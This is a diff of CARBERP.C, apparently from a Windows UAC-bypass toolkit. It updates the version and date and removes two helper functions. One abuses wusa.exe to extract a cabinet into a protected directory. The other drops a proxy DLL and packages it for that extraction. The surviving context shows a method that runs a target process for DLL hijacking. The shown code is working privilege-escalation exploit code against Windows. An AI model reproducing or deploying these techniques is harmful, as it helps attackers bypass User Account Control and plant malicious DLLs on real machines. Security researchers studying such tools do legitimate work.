@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     2.70
+*  VERSION:     2.74
 *
-*  DATE:        25 Mar 2017
+*  DATE:        10 June 2017
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -18,52 +18,6 @@
 *
 *******************************************************************************/
 #include "global.h"
-#include "makecab.h"
-
-/*
-* ucmWusaExtractPackage
-*
-* Purpose:
-*
-* Extract cab to protected directory using wusa.
-* This routine expect source as ellocnak.msu cab file in the temp folder.
-*
-*/
-BOOL ucmWusaExtractPackage(
-    _In_ LPWSTR lpTargetDirectory
-)
-{
-    BOOL bResult = FALSE;
-    SIZE_T Size;
-    LPWSTR lpCommandLine = NULL;
-    WCHAR szMsuFileName[MAX_PATH * 2];
-
-    if (lpTargetDirectory == NULL)
-        return FALSE;
-
-    RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
-    _strcpy(szMsuFileName, g_ctx.szTempDirectory);
-    _strcat(szMsuFileName, ELLOCNAK_MSU);
-
-    Size = ((1 + _strlen(lpTargetDirectory) + 
-        _strlen(szMsuFileName) + 
-        MAX_PATH) * sizeof(WCHAR));
-
-    lpCommandLine = (LPWSTR)supHeapAlloc(Size);
-    if (lpCommandLine) {
-
-        _strcpy(lpCommandLine, L"/c wusa ");
-        _strcat(lpCommandLine, szMsuFileName);
-        _strcat(lpCommandLine, L" /extract:");
-        _strcat(lpCommandLine, lpTargetDirectory);
-
-        bResult = supRunProcess(CMD_EXE, lpCommandLine);
-
-        supHeapFree(lpCommandLine);
-    }
-    DeleteFileW(szMsuFileName);
-    return bResult;
-}
 
 /*
 * ucmWusaMethod
@@ -139,56 +93,6 @@ BOOL ucmWusaMethod(
 
         //run target process for dll hijacking
         bResult = supRunProcess(szTargetProcess, NULL);
-
-    } while (cond);
-
-
-    return bResult;
-}
-
-/*
-* ucmCreateCabinetForSingleFile
-*
-* Purpose:
-*
-* Build cabinet for usage in methods where required 1 file.
-*
-*/
-BOOL ucmCreateCabinetForSingleFile(
-    _In_ LPWSTR lpSourceDll,
-    _In_ PVOID ProxyDll,
-    _In_ DWORD ProxyDllSize
-)
-{
-    BOOL     cond = FALSE, bResult = FALSE;
-    CABDATA *Cabinet = NULL;
-    LPWSTR   lpFileName;
-    WCHAR    szMsuFileName[MAX_PATH * 2];
-
-    if ((ProxyDll == NULL) || 
-        (ProxyDllSize == 0) ||
-        (lpSourceDll == NULL)) return bResult;
-
-    do {
-
-        //drop proxy dll
-        if (!supWriteBufferToFile(lpSourceDll, ProxyDll, ProxyDllSize)) {
-            break;
-        }
-
-        //build cabinet
-        RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
-        _strcpy(szMsuFileName, g_ctx.szTempDirectory);
-        _strcat(szMsuFileName, ELLOCNAK_MSU);
-
-        Cabinet = cabCreate(szMsuFileName);
-        if (Cabinet == NULL)
-            break;
-
-        lpFileName = _filename(lpSourceDll);
-        //put file without compression
-        bResult = cabAddFile(Cabinet, lpSourceDll, lpFileName);
-        cabClose(Cabinet);
 
     } while (cond);
 
